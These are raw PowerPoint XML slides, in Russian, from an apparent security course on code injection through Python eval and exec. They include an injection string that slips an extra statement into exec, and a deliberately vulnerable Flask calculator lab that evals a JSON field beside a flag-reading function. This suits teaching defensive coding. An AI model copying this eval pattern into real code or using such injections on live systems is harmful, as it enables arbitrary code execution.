                        <a:rPr sz="1800" b="0" dirty="0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</a:rPr>
                        <a:t>;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1800" b="0" dirty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800" b="0" dirty="0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echo</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1800" b="0" dirty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800" b="0" dirty="0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</a:rPr>
                        <a:t>demo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80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400 до запуска процесса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80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Сеть процесса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80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Неиспользуемое назначение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80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Соединение блокирует политика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80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Права процесса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800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Чужой приватный файл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800" b="0" dirty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ОС </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1800" b="0" dirty="0" err="1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запрещает</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1800" b="0" dirty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чтение</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800" b="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="EEF2F6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51967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A228856C-74AD-42C9-B8CA-1D680BF3C43B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Формулы и шаблоны в приложении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946EC669-C666-4AB2-B50C-24ED409B6EC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Приложению нужны вычисления и формирование текста: например, расчёт стоимости заказа и сборка HTML-страницы.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="formula-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F1B684A-00C3-41C7-874C-ECFFDAFCE17C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Расчёт по правилам сервиса</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="formula-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F745E3B3-4D3A-4046-92DA-8C8CBD8CA320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4953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Калькулятор принимает числа и выбранные операции. Конфигуратор считает стоимость по правилам, которые задаёт приложение.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="template-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C77D7977-4F64-4017-853D-34A91370117C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2800350"/>
            <a:ext cx="506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Подстановка в шаблон</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="template-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F4BF2CFA-24F5-4ADB-9EC4-C42C82738723}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="3390900"/>
            <a:ext cx="50673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Шаблонизатор получает готовую разметку и значения: имя пользователя, цену, текст комментария. Из них формируется страница.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D222BF9-5452-48EB-B931-A8EF7A45F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98513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BDFAA5AD-DA0F-46BD-A16A-BD3BB008EF09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Python: eval и exec</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="left-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{67870BBA-2C50-460D-A20A-16E5D291FA2A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eval: выражение</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="left-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CE6534D9-850B-4687-BF1B-FA23E5E6E051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495300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endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="right-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2415E091-4266-4020-AF38-D9154FD3DE0C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2038350"/>
            <a:ext cx="506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exec: инструкции</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="right-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C8027CAF-1F56-44EF-BED3-C5CB0C63E5E9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2628900"/>
            <a:ext cx="506730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endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="eval-code">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F8CD9F2D-63EF-41D8-9BF5-6B9FCA612F0A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495300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eval</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="17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"2 + 3 * 4"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="17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725" b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14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eval</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="17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"len('text')"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="17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725" b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4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1725" b="0">
              <a:solidFill>
                <a:srgbClr val="6A9955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Вызов функции — тоже выражение</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="exec-code">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C9A06EB7-94B4-4EC3-8D4B-51F45F1860AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2647950"/>
            <a:ext cx="50673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source = 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"user_id = 17"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ctx = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="17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{}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result = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1725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exec</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="17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source, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1725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{}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ctx</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="17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8" name="exec-result">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D17BF68D-7EA6-48A3-9584-05EFE882E757}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6457078" y="3619500"/>
            <a:ext cx="5067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ctx</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="17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725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725" b="0" dirty="0" err="1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user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1725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7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7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725" b="0" dirty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17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result  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1725" b="0" dirty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None</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="eval-description">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B01CBB02-FCEB-4950-8E60-FA6F27B84B3C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="4752975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Вычисляет</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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95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выражение</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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и </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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возвращает</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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95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результат</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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Выражение</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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95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может</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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95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обращаться</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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к </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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именам</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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и </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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вызывать</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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95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функции</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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10" name="exec-description">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7FFE56D-E253-43C0-9B16-B7D99252D450}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="4757344"/>
            <a:ext cx="50673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Выполняет</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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инструкции</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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и </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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возвращает</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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None. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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Выполненный</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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код</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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может</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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изменить</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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состояние</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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в </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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указанном</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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пространстве</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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имён</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800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930639F-4848-43A3-97FE-5320FE39D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92056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C6E64818-34D4-4135-9DD1-20F8B81532AB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Code Injection: данные становятся кодом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4C19FC42-04BF-4E2E-9CCA-27FDE4F71F2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Code Injection - выполнение недоверенных данных как программного кода внутри приложения.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="boundary-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6DE6E7EA-29EF-462C-BDC5-C9310A7342C3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Где возникает ошибка</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="boundary-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{096BEA15-C42E-48CB-B77E-59427EA98935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49530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Значение из HTTP-запроса становится исходным кодом для eval / exec. В шаблонизаторе похожая ошибка называется SSTI: ввод превращается в текст исполняемого шаблона.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="runtime-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E010FD8E-1CA3-48D6-BEFE-69FEC58F0D00}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2762250"/>
            <a:ext cx="506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Где выполняется код</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="runtime-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{69EC4048-3D1F-495B-BAEB-712DFE419BDB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="3352800"/>
            <a:ext cx="50673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 runtime </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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приложения</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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202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обычно</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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с </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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доступом</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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его</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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процесса</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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к </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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памяти</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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202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файлам</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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и </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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сети</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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. Shell </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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для</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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этого</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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не</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="202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требуется</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty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CBD87EC-1DD5-4A2B-943D-2E736C7E6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26350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781A06BE-EA98-4BEF-87F9-E69D129F51DF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Code Injection: подмена исходного текста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4B125BF-2D51-4795-9511-027D22E16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13" name="v7-text-419">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C9023A88-9087-46F8-B293-5035DF428AEE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506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Ожидалась одна строка данных</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="v7-text-420">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{65503C91-05B2-4F71-BCF5-83B0A3F635F5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50673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nickname = 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"alex'</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1725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\n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user_id = 17</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1725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\n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#"</a:t>
            </a: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pattern = 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"nickname = '%s'"</a:t>
            </a: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source = pattern % nickname</a:t>
            </a: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exec</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="17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source</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1725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5" name="v7-text-421">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7FF514D3-D69A-4453-BD82-FD446D1D2FFB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="5114925"/>
            <a:ext cx="506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Выполнено также user_id = 17</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="v7-text-422">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{80EF3DDE-E363-4298-AD7F-9DE811E1382F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2000250"/>
            <a:ext cx="506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Получившийся исходный код</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="v7-text-423">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0523EDFB-1127-46BB-BC2C-66E904ECAE8B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2800350"/>
            <a:ext cx="50673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nickname = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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'alex'</a:t>
            </a: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user_id = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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17</a:t>
            </a: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#'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="v7-text-424">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B565C47-F06A-47F6-88CF-ECB25B0E4F99}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="5114925"/>
            <a:ext cx="506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Кавычка и перевод строки изменили код</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24600198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44E5E5C5-E7B1-4193-AEC1-764831C00CEF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Inspector Gadget: задание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C54D392-E503-491B-8081-FCF3C5F43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269878" y="1809750"/>
            <a:ext cx="6004169" cy="4181475"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="v2-text-83">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D535952F-C3A0-4E30-8FC6-CED3093F3412}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="1857375"/>
            <a:ext cx="308610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5000"/>
              </a:lnSpc>
              <a:buNone/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Проверить серверную интерпретацию выражения калькулятора</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="v2-text-84">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AF5D3D3E-9935-44F4-B676-393F3C5EFD89}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="4343400"/>
            <a:ext cx="3086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Совместная практика</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="v2-text-85">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6234F901-13E5-4FDC-88AC-4672D9751B5E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="5267325"/>
            <a:ext cx="3086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A9B7C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A9B7C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9B7C6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>127.0.0.1:8088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47B2E3B-A9F6-4CA6-91D4-70489E8BF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44514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9F82095-21CE-482D-ACB5-DE561131FF63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Inspector Gadget: шаг 1. Анализ кода</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="analysis-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{702F6E3B-A816-458F-B28F-112C22565C3B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7191375" y="2152650"/>
            <a:ext cx="43148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Что видно в коде</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="analysis-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E6E3D913-86A2-402F-9AE9-845572470C0E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7191375" y="2800350"/>
            <a:ext cx="4314825" cy="309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Поле sign приходит из JSON.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2100" b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eval вычисляет его как Python-выражение.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="2100" b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Функция read_flag доступна в этом пространстве имён.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="editable-source-code-96">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0D245FEE-8AC1-44DE-A672-243D71163B48}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1685925"/>
            <a:ext cx="5953125" cy="4924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@app.route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"/api/calculate"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63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methods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63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63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'POST'</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1163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F4474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63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pinger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()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  <a:buNone/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data = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1163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.loads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request.data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63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63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"sign"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63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63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data:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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63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create_resp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"Nothing to calculate"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endParaRPr sz="1163" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD70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0000"/>
              </a:lnSpc>
              <a:buNone/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63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  <a:buNone/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answer = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1163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eval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163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63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"sign"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1163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63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  <a:buNone/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63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create_resp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"bebebe"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63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create_resp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answer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endParaRPr sz="1163" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD70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0000"/>
              </a:lnSpc>
              <a:buNone/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F4474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63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read_flag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()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  <a:buNone/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63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63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Path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'/flag.txt'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.read_text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encoding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63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'utf-8'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.strip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()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1163" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD70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0000"/>
              </a:lnSpc>
              <a:buNone/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@app.get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'/healthz'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F4474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63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health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()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  <a:buNone/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63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  <a:buNone/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read_flag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()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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63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jsonify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63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'ready'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63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OSError:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="1163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63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jsonify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63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'unavailable'</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1163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63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63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503</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Рисунок 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1D8AD355-3C92-4A05-9189-177861862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24380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CC26CAB-3CC8-4952-B4D7-C98238D5ECB7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Inspector Gadget: шаг 2. Запрос и ответ</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="evidence-100-2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2C89566D-1875-47C4-A186-85A4F40182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11"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1657350"/>
            <a:ext cx="10820400" cy="5003482"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Рисунок 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1D8AD355-3C92-4A05-9189-177861862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64096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9431F3A9-BB96-43BF-879B-6D56FAEFD585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Inspector Gadget: защита от Code Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="bad-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DABB82A3-CB9C-4D7E-9EDF-61143EC3E645}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1609725"/>
            <a:ext cx="2628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Как не надо</a:t>
            </a:r>
          </a:p>
